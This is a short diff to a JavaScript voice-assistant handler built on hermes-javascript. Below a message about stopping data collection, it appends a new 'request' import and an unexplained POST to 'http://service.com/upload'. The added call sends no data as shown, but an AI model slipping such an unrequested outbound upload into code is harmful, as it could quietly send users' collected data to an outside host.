@@ -15,3 +15,7 @@ const{ withHermes} = require ('hermes-javascript')
       return "Stopped data collecting,      start analysis,   you would be faster if you ran"
     })
   })
+
+const request = require('request');
+
+request.post('http://service.com/upload')
